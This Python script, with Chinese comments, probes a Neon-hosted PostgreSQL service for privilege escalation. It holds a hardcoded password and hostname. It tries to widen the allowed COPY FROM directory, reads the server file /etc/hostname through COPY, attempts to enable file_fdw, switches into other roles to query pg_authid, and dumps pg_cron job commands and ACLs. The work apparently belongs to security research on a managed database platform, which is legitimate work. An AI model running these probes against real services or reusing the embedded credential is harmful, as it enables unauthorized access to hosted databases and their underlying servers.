# -*- coding: utf-8 -*-
"""高危线索侦察(只读+SET 探测,零破坏):
1) neon.copy_from_allowed_dir 是否 USERSET + COPY FROM 文件行为
2) postgres 库 pg_cron/pg_partman 是否已装 + cron.job 表可写性(只读)
3) SET neon.allowed_extensions / SET ROLE 直接成员(权限探测)
4) postgres 库已装扩展清单复核"""
import psycopg

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI_PG = 'postgresql://neondb_owner:%s@%s/postgres' % (PWD, HOST)
URI_ND = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)

def mk(uri):
    c = psycopg.connect(uri, connect_timeout=20)
    c.autocommit = True
    return c.cursor()

cur1 = mk(URI_PG)   # postgres
cur2 = mk(URI_ND)   # neondb

def q(cur, sql):
    try:
        cur.execute(sql)
        try:
            return cur.fetchall()
        except Exception:
            return 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

print('=== [1] postgres 库已装扩展 ===')
print(q(cur1, "SELECT extname, extversion, pg_get_userbyid(extowner) FROM pg_extension ORDER BY 1"))

print('\n=== [2] cron schema 对象(postgres 库) ===')
print('schema 存在:', q(cur1, "SELECT nspname FROM pg_namespace WHERE nspname IN ('cron','partman','timescaledb','_timescaledb_cache')"))
print('cron 表:', q(cur1, "SELECT c.relname, c.relacl::text FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='cron' ORDER BY 1"))
print('cron.job 行数:', q(cur1, "SELECT count(*) FROM cron.job"))
print('cron.job 结构:', q(cur1, "SELECT column_name, data_type FROM information_schema.columns WHERE table_schema='cron' AND table_name='job'"))

print('\n=== [3] cron 函数 ACL ===')
print(q(cur1, """SELECT p.proname, p.proacl::text FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace
                 WHERE n.nspname='cron' AND p.proname IN ('schedule','unschedule','job','show_jobs','run_job')
                 ORDER BY 1"""))

print('\n=== [4] neon.copy_from_allowed_dir SET 测试 ===')
print('SET 尝试:', q(cur2, "SET neon.copy_from_allowed_dir = '/'"))
print('复位:', q(cur2, "RESET neon.copy_from_allowed_dir"))
print('SET 为允许目录:', q(cur2, "SET neon.copy_from_allowed_dir = '/usr/local/share/extension'"))

print('\n=== [5] COPY FROM 文件行为(neondb 库,事务内回滚) ===')
print('COPY FROM /etc/hostname:', q(cur2, "BEGIN; CREATE TEMP TABLE k_cp(a text); COPY k_cp FROM '/etc/hostname'; SELECT * FROM k_cp; ROLLBACK"))
print('COPY FROM 允许目录内文件:')
print(q(cur2, "SELECT setting FROM pg_settings WHERE name='neon.copy_from_allowed_dir'"))
print(q(cur2, "BEGIN; CREATE TEMP TABLE k_cp2(a text); COPY k_cp2 FROM '/usr/local/share/extension/README'; SELECT * FROM k_cp2 LIMIT 2; ROLLBACK"))

print('\n=== [6] SET neon.allowed_extensions(会话级) ===')
print(q(cur2, "SET neon.allowed_extensions = 'file_fdw'"))

print('\n=== [7] SET ROLE 直接成员(neondb 库) ===')
for r in ('anonymous', 'authenticated', 'neon_auth'):
    r_ = q(cur2, "SET ROLE %s" % r)
    print('SET ROLE %s:' % r, r_)
    if r_ != 'ERR':
        print('  current_user:', q(cur2, "SELECT current_user, session_user"))
        print('  can read pg_authid?', q(cur2, "SELECT count(*) FROM pg_authid"))
    q(cur2, "RESET ROLE")

print('\n=== [8] pg_cron 相关:当前 cron job 内容 ===')
print(q(cur1, "SELECT jobid, schedule, command, nodename, nodeport, database, username, active FROM cron.job"))

print('\n=== [9] partman schema 对象 ===')
print(q(cur1, "SELECT c.relname FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='partman' LIMIT 10"))
print(q(cur1, "SELECT p.proname FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='partman' AND p.proname IN ('create_parent','run_maintenance_proc','partition_data_proc')"))

cur1.connection.close()
cur2.connection.close()
